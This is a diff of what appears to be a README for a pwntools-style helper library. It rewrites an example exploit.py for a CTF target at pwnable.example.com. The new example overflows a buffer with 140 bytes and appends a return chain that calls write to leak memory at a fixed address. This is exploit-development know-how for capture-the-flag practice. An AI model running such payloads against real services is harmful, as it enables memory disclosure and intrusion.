@@ -27,19 +27,22 @@ __exploit.py__:
 from pwn  import *
 from ebil import *
 
-exec ebil('./vuln', remote=('pwnable.example.com', 35555))
+exec ebil('./vuln', remote=('pwnable.example.com', 35555), args=['wei'])
+x86_64()
 
-if LOCAL:
-  log.info('** LOCAL **')
+if LOCAL: log.info('** LOCAL **')
 
-print r.recvline()
+payload = 'a'*140
 
-payload = 'xxxx'
-print '>', payload
-breakpoint()
+dummy = 0xbeefbeefbeefbeef
+payload += chain([
+  elf.symbols['write'], dummy, 1, 0x8049348, 4,
+])
+send(payload, 200)
 
-send(payload, 4)
+print repr(r.recvrepeat())
 
+r.wait_for_close()
 ```
 
 ## Installation
